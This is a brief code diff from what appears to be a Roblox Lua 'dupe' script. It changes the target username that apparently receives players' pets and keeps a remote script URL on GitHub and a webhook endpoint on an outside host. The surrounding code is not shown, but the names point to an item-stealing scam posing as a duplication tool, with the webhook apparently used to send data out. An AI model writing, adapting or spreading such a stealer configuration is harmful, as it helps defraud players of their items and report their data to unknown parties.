@@ -26,7 +26,7 @@ local TrashPetList = {
 }
 
 
-local TargetUsername = "FodieCookie"
+local TargetUsername = "ProCpvpT2"
 local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
 local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"
 
